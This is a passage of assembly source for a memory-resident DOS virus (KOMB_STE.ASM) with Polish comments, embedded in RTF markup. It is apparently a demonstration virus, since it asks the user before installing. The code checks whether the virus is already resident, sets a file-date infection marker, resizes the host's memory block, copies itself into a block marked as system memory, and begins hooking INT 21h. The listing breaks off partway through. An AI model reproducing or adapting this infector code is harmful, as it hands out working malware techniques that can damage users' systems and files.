\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; Kompilacja :                                                               ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;             TASM     KOMB_STE.ASM                                          ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;             TLINK /t KOMB_STE.OB J                                         ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch JUMPS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch KOMB_STE SEGMENT}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         ASSUME CS:KOMB_STE, DS:KOMB_STE}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         ORG 100h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      Haslo     = 0BACAh                    ; \\ do sprawdzenia czy wirus jest}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      Odpowiedz = 0CABAh                    ; / juz zainstalowany w pamieci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            NUL = 00h                       ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            LF  = 0Ah                       ;  - stale znakow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            CR  = 0Dh                       ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   AtrReadOnly  = 00000001b                 ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   AtrHidden    = 00000010b                 ;  \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   AtrSystem    = 00000100b                 ;   \\ rozne stale atrybutow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   AtrVolumeID  = 00001000b                 ;   / pozycji katalogu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   AtrDirectory = 00010000b                 ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   AtrArchive   = 00100000b                 ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DTAStruc struc                             ; struktura DTA bufora transmisji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; dyskowych uzywana przez}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; funkcje 4E i 4F}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DTAFill db 21 dup (?)       ; nieistotna czesc struktury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DTAAttr db ?                ; atrybut znalezionej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DTATime dw ?                ; czas znalezionej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DTADate dw ?                ; data znalezionej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DTASize dd ?                ; dlugosc znalezionej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DTAName db 13 dup (?)       ; nazwa znalezionej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DTAStruc ends}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DIRStruc struc}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DIRDrv      db ?            ; numer napedu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DIRName     db 8 dup(?)     ; nazwa znalezionej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DIRExt      db 3 dup(?)     ; rozszerzenie znalezionej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DIRAttr     db ?            ; atrybut znalezionej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DIRRes      db 10 dup(?)    ; zarezerwowane}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DIRTime     dw ?            ; czas znalezionej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DIRDate     dw ?            ; data znalezionej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DIRStartJAP dw ?            ; poczatkowa JAP znalezionej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DIRSize     dd ?            ; dlugosc znalezionej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DIRStruc ends}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SFTStruc struc}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                SFTCntHnd   dw ?            ; ile uchwytow do pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                SFTOpMode   dw ?            ; tryb otwarcia pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                SFTAttr     db ?            ; atrybut pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                SFTDevAttr  dw ?            ; informacja o urzadzeniu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                SFTDevPtr   dd ?            ; adres do naglowka sterownika}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; lub do DPB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                SFTStartJAP dw ?            ; poczatkowa JAP pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                SFTTime     dw ?            ; czas pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                SFTDate     dw ?            ; data pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                SFTSize     dd ?            ; dlugosc znalezionej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                SFTPos      dd ?            ; wskaznik odczytu/zapisu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                SFTRes      db 7 dup(?)     ; pola nieistotne}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                SFTName     db 11 dup(?)    ; nazwa + rozszerzenie pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SFTStruc ends}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VRok          = 1998                       ; \\  data opisujaca}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VMiesiac      = 13                         ;  - pliki juz zainfekowane}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VDzien        = 31                         ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VZnacznik     = (VRok-1980)*512+VMiesiac*32+VDzien}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DlugoscWirusa = (Offset KoniecWirusa-Offset PoczatekWirusa)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DlugoscWPamieci = (DlugoscWirusa +31)/16}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Start:                                     ; poczatek wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PoczatekWirusa:                            ; pomocnicza etykieta}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  Trik                             ; zapisz na stosie relatywny ofset}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Trik:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   si                               ; zdejmij ze stosu relatywny ofset}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     sub   si,103h                          ; oblicz ofset do poczatku wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,Haslo                         ; \\ sprawdz, czy wirus jest}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; / juz w pamieci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   ax,Odpowiedz                     ; \\ czy kopia wirusa odpowiedziala ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jne   InstalacjaWPamieci               ; / NIE - zainstaluj}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; TAK - wypisz komunikat}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   di,TeBylZainstalowany            ;    /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     call  DrukSI                           ;   /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jmp   PowrocDoNosiciela                ; i powroc do nosiciela}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch InstalacjaWPamieci:                        ; poczatek instalacji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   di,TeCopyRight                   ; \\ wyswietl info o wirusie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  DrukSI                           ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   di,TeInstalacja                  ; \\  zapytaj uzytkownika, czy chce}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  DrukSI                           ;  \\ zainstalowac wirusa w pamieci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  Decyzja                          ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    PowrocDoNosiciela                ; /  CF=1 uzytkownik nie chce instalowac}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,3521h                         ; funkcja DOS - wez adres INT 21}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   [si][Stare21Seg],es              ; \\ zachowaj adres (wirus bedzie go}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   [si][Stare21Ofs],bx              ; / uzywal)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,ds                            ; przywroc ES}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   es,ax                            ; AX=ES=DS=CS=SS=PSP}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     dec   ax                               ; AX=ES-1=MCB aktualnego bloku pamieci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ds,ax                            ; DS=blok MCB aktualnego bloku pamieci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   bx,word ptr ds:[0003h]           ; wez dlugosc bloku pamieci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     sub   bx,DlugoscWPamieci+1             ; zmniejsz go o dlugosc wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,4Ah                           ; funkcja DOS - zmien rozmiar bloku pamieci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   bx,DlugoscWPamieci               ; podaj jaki chcesz blok pamieci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,48h                           ; funkcja DOS - przydzial bloku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    PowrocDoNosiciela                ; CF=1 nie udalo sie przydzielic}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   es,ax                            ; ES=wskazuje na przydzielony blok}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   di,di                            ; ES:DI - dokad skopiowac}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cld                                    ; zwiekszaj SI, DI w REP MOVSB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  si                               ; SI bedzie zmieniany wiec zachowaj}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     add   si,offset PoczatekWirusa         ; dodaj skad kopiowac}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,DlugoscWirusa                 ; cx=ile bajtow kopiowac}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     rep   movs byte ptr es:[di], cs:[si]   ; kopiuj z CS:SI do ES:DI, CX bajtow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   si                               ; przywroc relatywny ofset}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,es                            ; pobierz adres do MCB opisujacego}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     dec   ax                               ; blok, w ktorym jest wirus}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ds,ax                            ; DS=MCB wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   word ptr ds:[0001h],0008h        ; ustaw MCB wirusa jako systemowy}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     sub   ax,0Fh                           ; \\  DS=adres bloku-10h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ds,ax                            ;  \\ sztuczka, dzieki ktorej mozna}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ;  / odwolywac sie do danych jak w}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; /  zwyklym programie COM (ORG 100h)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   dx,Offset NoweInt21              ; DX=adres do nowej procedury INT 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
